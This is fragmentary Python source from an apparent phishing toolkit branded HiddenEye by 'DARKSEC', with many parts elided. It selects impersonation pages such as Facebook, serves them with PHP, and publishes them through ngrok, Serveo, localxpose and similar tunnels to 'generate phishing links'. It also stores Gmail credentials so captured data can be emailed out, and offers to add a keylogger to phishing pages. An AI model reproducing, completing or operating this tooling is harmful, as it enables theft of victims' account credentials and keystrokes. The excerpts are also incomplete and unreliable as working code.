...
def runPhishing(page, customOption):  # Phishing pages selection menu
    ...
    if customOption == "1" and page == "Facebook":
        ...
        print(
            "\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(1)"
            .format(MAIN0, MAIN4))
        print(
            "\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(1)]"
            .format(MAIN0, MAIN4))
        input(
        ...
        print(
            "\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(2)"
            .format(MAIN0, MAIN4))
        print(
            "\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(2)]"
            .format(MAIN0, MAIN4))
        input(
            "\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue."
            .format(MAIN0, MAIN4))
...
def selectPort():  # Question where user must select port
    ...
    print("""
        ...
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------"""
          .format(MAIN0, MAIN2))
    print("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(
        MAIN0, MAIN4))
...
def runLocalhost(port):
    ...
    print("""
        ...
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALHOST SERVER ]{1}!! {0}\n-------------------------------"""
          .format(MAIN0, MAIN2))
    print(
        "\n {0}[{1}*{0}]{0}Enter Your LocalHost/Router Address [ifconfig]:{1}".
        format(MAIN0, MAIN4))
    host = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
    system("fuser -k %s/tcp > /dev/null 2>&1".format(port))
    system("cd Server/www/ && php -S {0}:{1} > /dev/null 2>&1 &".format(
        host, port))
...
def runPagekite(port):
    ...
    if 256 == system("which python2 > /dev/null"):
        ...
        try:
            subdomain = input(
                "\n{0}[{2}*{0}] {0}Enter A Custom Subdomain Ex.(yourname):\n{0}Custom Subdomain>>> {2}"
                .format(MAIN0, MAIN4, MAIN2))
            print(
...
def manageOpenporturl(port):
    ...
    print("{0}[{1}*{0}] {1}Working To Get OpenPort Tunnel Activation Link...".
          format(MAIN0, MAIN4))
    with open("openport.txt") as f:
        ...
        if "openport.io/l/" in read_data:
            ...
            print("{0}[{1}^{0}] {1}Failed To Get Openport Activation Link... ".
                  format(MAIN0, MAIN4))
    ...
    while True:
        ...
        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
            print(
                ...
                .format(MAIN0, MAIN2, MAIN3, port) + url +
...
def randomLocalxpose(port):
    ...
    print("""
        ...
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM LOCALXPOSE URL ]{1}!! {0}\n-------------------------------"""
          .format(MAIN0, MAIN2))
    system("./Server/loclx tunnel http --to :%s > link.url 2> /dev/null &" %
           (port))
    sleep(8)
    try:
        output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",
...
def runServeo(port):
    print("""
        ...
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allows Phishing.\n{0}[{1}!{0}]{1}They Drops The Connection Whenever Detects Phishing. """
          .format(MAIN0, MAIN2))
    print(
        "\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}"
        .format(MAIN0, MAIN2))
    print(
        "\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)"
        .format(MAIN0, MAIN2))
...
def runLT(port, npm):
    ...
    try:
        system("{0}lt -p ".format("" if npm else "Server/") + port +
...
________________________________________________________________________________"""
          .format(MAIN3, MAIN4, MAIN2, MAIN0, version))
    print(
...
def inputCustom():  # Question where user can input custom web-link
    ...
    print("""{1}
        ...
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ] {0}\n-------------------------------"""
          .format(MAIN0, MAIN2))
    print("""\n{1}**{0}(Do not leave it blank. Unless Errors may occur)""".
          format(MAIN2, MAIN4))
    print("""\n{0}[{1}*{0}]{0}Insert a custom redirect url:""".format(
        MAIN0, MAIN4))
...
def addingEmail():
    ...
    print(
        ...
        .format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,
                                                          MAIN2)).upper()
    if choice == "Y":
        print(
...
def emailConfig():
    system(
        "cp Defs/Send_Email/EmailConfigDefault.py Defs/Send_Email/emailconfig.py"
    )
    GMAILACCOUNT = input(
    ...
    with open("Defs/Send_Email/emailconfig.py") as f:
        ...
        print("{0}[.] {1}Password(Encoded) Added To config File. !\n".format(
            MAIN0, MAIN4))
    RECIPIENTEMAIL = input("{0}[{1}+{0}]{0} Enter Recipient Email:{1} ".format(
        MAIN0, MAIN4))
    with open("Defs/Send_Email/emailconfig.py") as f:
        read_data = f.read()
        ...
        print("{0}[.] {1}Recipient Email Address Added To config File. !\n".
              format(MAIN0, MAIN4))
        print(
            "\n\n{0}[{1}SUCCESS{0}]{0}: Created Config File & Saved To (Defs/Send_Email/Config.py)"
            .format(MAIN0, MAIN4))
...
def addingkeylogger():
    print(
        ...
        .format(MAIN0, MAIN4))
    print(
        "\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)"
        .format(MAIN0, MAIN4))
    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,
                                                          MAIN2)).upper()
    if choice == "Y":
...
def emailPrompt3(port):
    choice = input(
        ...
        .format(MAIN0, MAIN4, MAIN2)).upper()
...
def writeLog(ctx):  # Writing log
    if (config.get(
            "Settings",
            "DidBackground") == "True"):  # if didBackground == True, write
        logFile.write(
            ctx.replace(MAIN0, "").replace(MAIN1, "").replace(
